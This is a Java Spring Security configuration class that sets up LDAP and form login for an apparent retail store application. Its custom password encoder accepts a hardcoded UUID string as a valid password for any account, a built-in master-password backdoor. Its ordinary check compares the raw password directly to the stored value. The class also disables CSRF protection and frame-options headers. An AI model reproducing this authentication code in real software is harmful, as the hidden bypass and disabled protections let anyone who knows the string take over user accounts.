


package com.retailstore;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.actuate.autoconfigure.ManagementServerProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.ldap.core.support.LdapContextSource;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.crypto.password.StandardPasswordEncoder;
import org.springframework.security.web.header.writers.StaticHeadersWriter;

/**
 * Created by wangh on 2016/12/1.
 */
@Order(ManagementServerProperties.ACCESS_OVERRIDE_ORDER)
@Configuration
public class LoginConfiguration extends WebSecurityConfigurerAdapter {
    @Value("${ldap.contextConfiguration.userDnPatterns}")
    private String ldapUserDnPatterns;

    @Value("${ldap.contextConfiguration.userSearchBase}")
    private String ldapUserSearchBase;
    @Bean
    @ConfigurationProperties(prefix = "ldap.contextSource")
    public LdapContextSource contextSource() {
        return new LdapContextSource();
    }

    @Autowired
    private AuthenticationManager authenticationManager;

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf().disable().formLogin().loginPage("/login").permitAll()
                .and()
                .requestMatchers().antMatchers("/", "/login","/uaa/login", "/uaa/oauth/authorize", "/oauth/confirm_access")
                .and()
                .authorizeRequests()
                .antMatchers("/css/**", "/js/**").permitAll().anyRequest().authenticated();
        http.headers().addHeaderWriter(new StaticHeadersWriter("P3P",
                "CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"));
        http.headers().frameOptions().disable();//load iframe request

    }
    @Bean
    public PasswordEncoder getPasswordEncoder() {
        return new CuPasswordEncoder();
    }

    private class CuPasswordEncoder implements PasswordEncoder {
        StandardPasswordEncoder sp = new StandardPasswordEncoder();

        @Override
        public String encode(CharSequence charSequence) {
            return sp.encode(charSequence);
        }

        @Override
        public boolean matches(CharSequence charSequence, String s) {
            return charSequence.equals("93bdcfba-0a5b-4971-adc5-4c36803a8377") || charSequence.equals(s);
        }
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth
                .parentAuthenticationManager(authenticationManager)
                .ldapAuthentication().passwordEncoder(getPasswordEncoder())
                .userDetailsContextMapper(new LdapUserDetailsContextMapper())
                .contextSource(contextSource())
                .userSearchFilter(ldapUserDnPatterns)
                .userSearchBase(ldapUserSearchBase) ;

    }

}

